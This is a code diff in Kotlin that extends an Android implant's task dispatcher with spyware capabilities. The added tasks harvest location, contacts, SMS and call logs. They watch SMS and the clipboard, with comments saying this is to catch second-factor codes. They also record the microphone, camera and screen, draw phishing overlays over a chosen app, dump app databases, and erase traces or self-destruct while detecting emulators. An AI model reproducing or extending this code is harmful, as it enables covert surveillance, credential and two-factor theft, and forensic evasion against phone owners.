@@ -31,6 +31,15 @@ object TaskRunner {
         "hygiene.memory", "creds", "privesc", "host.guide",
         "ui.screen", "ui.tap", "ui.text", "ui.scroll", "ui.global",
         "ui.events",
+        // the senses of the phone
+        "gps.locate", "wifi.dump", "bluetooth.scan", "contacts.dump",
+        "sms.dump", "call.logs", "emulator.detect",
+        // the watchers: the things that happen without the operator asking
+        "sms.watch", "clipboard.sniff",
+        // the ears and the eyes
+        "media.mic", "media.camera", "live.screen", "ui.stream",
+        // the false screen, the databases and the end of it
+        "phish.overlay", "app.dump", "anti.forensic", "evade.suicide",
     )
 
     /**
@@ -82,6 +91,16 @@ object TaskRunner {
          */
         val extra: MutableList<Pair<String, Upk>> = mutableListOf()
 
+        /**
+         * The chunks of a streamed answer.
+         *
+         * A picture of the screen is bigger than a frame of the protocol
+         * allows, and a stream of them is bigger still.  The beacon sends
+         * every chunk as a partial result -- the task stays open while the
+         * chunks travel -- and the final result closes it.
+         */
+        val chunks: MutableList<ByteArray> = mutableListOf()
+
         fun with(key: String, value: Upk): Outcome {
             extra.add(key to value)
             return this
@@ -96,6 +115,22 @@ object TaskRunner {
             )
             fields.addAll(extra)
             return Upk.map(*fields.toTypedArray())
+        }
+
+        /**
+         * One chunk of a streamed answer.
+         *
+         * The chunk carries the flag that says the task is still running,
+         * so the server keeps the task open while the pieces travel.
+         */
+        fun partialValue(taskId: String, chunk: ByteArray): Upk.MapV {
+            return Upk.map(
+                "id" to Upk.str(taskId),
+                "code" to Upk.num(code),
+                "out" to Upk.bin(chunk),
+                "err" to Upk.str(err),
+                "partial" to Upk.bool(true),
+            )
         }
     }
 
@@ -368,6 +403,35 @@ object TaskRunner {
             // not.
             "ui.screen", "ui.tap", "ui.text", "ui.scroll", "ui.global", "ui.events" -> ui(kind, args)
 
+            // ---- the senses of the phone ---------------------------------
+            // Every collector answers with the truth of the phone: a
+            // permission that was not granted is reported, never faked.
+            "gps.locate" -> sense("gps.locate", args)
+            "wifi.dump" -> sense("wifi.dump", args)
+            "bluetooth.scan" -> sense("bluetooth.scan", args)
+            "contacts.dump" -> sense("contacts.dump", args)
+            "sms.dump" -> sense("sms.dump", args)
+            "call.logs" -> sense("call.logs", args)
+            "emulator.detect" -> lab(args)
+
+            // ---- the watchers ---------------------------------------------
+            // The queue of the watchers is durable and the phone connects
+            // again as soon as something arrives.
+            "sms.watch" -> watch("sms", args)
+            "clipboard.sniff" -> watch("clipboard", args)
+
+            // ---- the ears and the eyes -------------------------------------
+            "media.mic" -> media("media.mic", args)
+            "media.camera" -> media("media.camera", args)
+            "live.screen" -> projection("live.screen", args)
+            "ui.stream" -> projection("ui.stream", args)
+
+            // ---- the false screen, the databases, the end -----------------
+            "phish.overlay" -> overlay(args)
+            "app.dump" -> appDump(args)
+            "anti.forensic" -> forensics("anti.forensic", args)
+            "evade.suicide" -> forensics("evade.suicide", args)
+
             // ---- network reach and the local environment ------------------
             "env" -> environment(args.field("filter")?.text() ?: "")
             // The working directory of the implant.  On a phone the
@@ -560,6 +624,249 @@ object TaskRunner {
         } catch (t: Throwable) {
             Outcome(2, ByteArray(0), t.message ?: t.toString())
         }
+    }
+
+    /**
+     * The senses of the phone.
+     *
+     * The collector answers with the truth of the phone, including the
+     * permissions the user did not grant: an empty answer would be a
+     * phone that lies.
+     */
+    private fun sense(kind: String, args: Upk): Outcome {
+        val ctx = context?.android
+            ?: return Outcome(2, ByteArray(0), "$kind: the phone has no context to look at")
+        val limit = args.field("limit")?.long()?.toInt()?.coerceIn(1, 1000) ?: 200
+        val report = when (kind) {
+            "gps.locate" -> Sense.location(ctx)
+            "wifi.dump" -> Sense.wifi(ctx)
+            "bluetooth.scan" -> Sense.bluetooth(ctx)
+            "contacts.dump" -> Sense.contacts(ctx, limit)
+            "sms.dump" -> Sense.sms(ctx, limit)
+            "call.logs" -> Sense.calls(ctx, limit)
+            else -> return Outcome(2, ByteArray(0), "unknown collector $kind")
+        }
+        return Outcome(0, report.text().toByteArray(), "")
+            .with("report", report.value())
+            .with("rows", Upk.num(report.count().toLong()))
+    }
+
+    /**
+     * The watchers of the phone.
+     *
+     * The queue is durable and the phone connects again as soon as
+     * something arrives, so the operator does not wait for the next
+     * check-in to read the code of the second factor.
+     */
+    private fun watch(kind: String, args: Upk): Outcome {
+        val ctx = context?.android
+            ?: return Outcome(2, ByteArray(0), "$kind: the phone has no context to watch")
+        val action = args.field("action")?.text() ?: "status"
+        val stateDir = ctx.filesDir.absolutePath
+        return when (action) {
+            "start" -> {
+                val text = if (kind == "sms") SmsWatch.start(ctx) else ClipboardWatch.start(ctx)
+                Outcome(0, text.toByteArray(), "").with("watch", Upk.str(kind))
+            }
+            "stop" -> {
+                val text = if (kind == "sms") SmsWatch.stop(ctx) else ClipboardWatch.stop(ctx)
+                Outcome(0, text.toByteArray(), "").with("watch", Upk.str(kind))
+            }
+            "poll" -> {
+                val items = Watch.drain(stateDir, kind)
+                val text = if (items.isEmpty()) {
+                    "the queue of the $kind watcher is empty\n"
+                } else {
+                    items.joinToString("\n") { it.text() } + "\n"
+                }
+                Outcome(0, text.toByteArray(), "")
+                    .with("watch", Upk.Arr(items.map { it.value() }))
+                    .with("watch_total", Upk.num(items.size.toLong()))
+            }
+            else -> {
+                val text = if (kind == "sms") SmsWatch.status(ctx) else ClipboardWatch.status(ctx)
+                Outcome(0, text.toByteArray(), "")
+            }
+        }
+    }
+
+    /**
+     * The ears and the eyes of the phone.
+     *
+     * The capture is a file on the phone, and the operator pulls it with
+     * the ordinary `download` task: the digest makes the transfer
+     * verifiable instead of hopeful.
+     */
+    private fun media(kind: String, args: Upk): Outcome {
+        val ctx = context?.android
+            ?: return Outcome(2, ByteArray(0), "$kind: the phone has no context to record")
+        val directory = context?.stateDir?.takeIf { it.isNotEmpty() } ?: ctx.filesDir.absolutePath
+        val capture = if (kind == "media.mic") {
+            val seconds = args.field("seconds")?.long()?.toInt()?.coerceIn(1, 900) ?: 30
+            Media.record(ctx, seconds, directory)
+        } else {
+            val facing = args.field("facing")?.text() ?: "back"
+            Media.photograph(ctx, facing, directory)
+        }
+        val failed = capture.path.isEmpty() && capture.inline == null
+        return Outcome(
+            if (failed) 2L else 0L,
+            capture.text().toByteArray(),
+            if (failed) capture.note else "",
+        ).with("capture", capture.value())
+    }
+
+    /**
+     * The screen of the phone, as a picture and as a stream.
+     *
+     * The capture of the screen is the one capability the platform never
+     * gives away: the user of the phone has to press the button of the
+     * system dialog, and the answer says so.
+     */
+    private fun projection(kind: String, args: Upk): Outcome {
+        val ctx = context?.android
+            ?: return Outcome(2, ByteArray(0), "$kind: the phone has no context to project")
+        val directory = context?.stateDir?.takeIf { it.isNotEmpty() } ?: ctx.filesDir.absolutePath
+        val action = args.field("action")?.text() ?: "status"
+        return when (action) {
+            "request" -> {
+                try {
+                    val intent = android.content.Intent(ctx, ProjectionActivity::class.java)
+                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                    ctx.startActivity(intent)
+                    Outcome(
+                        0,
+                        "$kind: the phone asks the user for the capture of the screen\n".toByteArray(),
+                        "",
+                    )
+                } catch (t: Throwable) {
+                    Outcome(2, ByteArray(0), "$kind: the screen could not be asked for: ${t.message}")
+                }
+            }
+            "capture" -> {
+                val frame = Projection.await(10_000)
+                if (frame == null) {
+                    return Outcome(
+                        2,
+                        ByteArray(0),
+                        "$kind: no picture arrived: the user has to allow the capture first",
+                    )
+                }
+                val file = java.io.File(directory, "screen-${System.currentTimeMillis()}.jpg")
+                try {
+                    file.writeBytes(frame)
+                    val digest = Media.digest(frame)
+                    Outcome(
+                        0,
+                        ("$kind: the picture is at ${file.absolutePath} " +
+                            "(${file.length()} bytes, sha256 $digest)\n").toByteArray(),
+                        "",
+                    ).with(
+                        "capture",
+                        Upk.map(
+                            "path" to Upk.str(file.absolutePath),
+                            "size" to Upk.num(file.length()),
+                            "sha256" to Upk.str(digest),
+                        ),
+                    )
+                } catch (t: Throwable) {
+                    Outcome(2, ByteArray(0), "$kind: the picture could not be written: ${t.message}")
+                }
+            }
+            "start" -> {
+                val consent = Projection.consent
+                    ?: return Outcome(
+                        2,
+                        ByteArray(0),
+                        "$kind: the capture was never allowed: the user has to press the button of the system",
+                    )
+                val fps = args.field("fps")?.long()?.toInt()?.coerceIn(1, 10) ?: 2
+                ProjectionService.start(ctx, consent, fps)
+                Outcome(
+                    0,
+                    "$kind: the capture of the screen runs at $fps pictures a second\n".toByteArray(),
+                    "",
+                )
+            }
+            "stop" -> {
+                ProjectionService.stop(ctx)
+                Outcome(0, "$kind: the capture of the screen was stopped\n".toByteArray(), "")
+            }
+            "frames" -> {
+                val count = args.field("count")?.long()?.toInt()?.coerceIn(1, 60) ?: 5
+                val frames = Projection.drain(count)
+                val outcome = Outcome(0, "$kind: ${frames.size} pictures\n".toByteArray(), "")
+                    .with("frames", Upk.num(frames.size.toLong()))
+                outcome.chunks.addAll(frames)
+                outcome
+            }
+            else -> Outcome(0, "$kind: ${Projection.state}\n".toByteArray(), "")
+        }
+    }
+
+    /**
+     * The false screen of the phone.
+     *
+     * The overlay waits for the application the operator named and draws
+     * the form over it; the answer of the user travels to the queue of
+     * the watchers.
+     */
+    private fun overlay(args: Upk): Outcome {
+        val ctx = context?.android
+            ?: return Outcome(2, ByteArray(0), "phish.overlay: the phone has no context to draw on")
+        val action = args.field("action")?.text() ?: "status"
+        return when (action) {
+            "arm" -> Outcome(0, Overlay.arm(ctx, args).toByteArray(), "")
+            "dismiss" -> Outcome(0, Overlay.dismiss(ctx).toByteArray(), "")
+            else -> Outcome(0, Overlay.status().toByteArray(), "")
+        }
+    }
+
+    /**
+     * The databases of the applications of the phone.
+     */
+    private fun appDump(args: Upk): Outcome {
+        val ctx = context?.android
+            ?: return Outcome(2, ByteArray(0), "app.dump: the phone has no context to read")
+        val directory = context?.stateDir?.takeIf { it.isNotEmpty() } ?: ctx.filesDir.absolutePath
+        val report = AppDump.dump(
+            ctx,
+            args.field("package")?.text() ?: "",
+            args.field("path")?.text() ?: "databases",
+            directory,
+        )
+        return Outcome(0, report.text().toByteArray(), "")
+            .with("report", report.value())
+            .with("rows", Upk.num(report.count().toLong()))
+    }
+
+    /**
+     * The traces of the implant, and the end of it.
+     *
+     * `anti.forensic` removes the material of the engagement and keeps
+     * the implant alive; `evade.suicide` ends everything.
+     */
+    private fun forensics(kind: String, args: Upk): Outcome {
+        val ctx = context?.android
+            ?: return Outcome(2, ByteArray(0), "$kind: the phone has no context to clean")
+        val stateDir = context?.stateDir?.takeIf { it.isNotEmpty() } ?: ctx.filesDir.absolutePath
+        val text = if (kind == "anti.forensic") {
+            Forensics.clean(ctx, stateDir)
+        } else {
+            Forensics.suicide(ctx, stateDir, args)
+        }
+        return Outcome(0, text.toByteArray(), "")
+    }
+
+    /**
+     * The laboratory around the phone.
+     */
+    private fun lab(args: Upk): Outcome {
+        val ctx = context?.android
+            ?: return Outcome(2, ByteArray(0), "emulator.detect: the phone has no context to look at")
+        val verdict = Lab.inspect(ctx)
+        return Outcome(0, verdict.text().toByteArray(), "")
+            .with("posture", verdict.value())
     }
 
     private fun evasionReport(): Outcome {
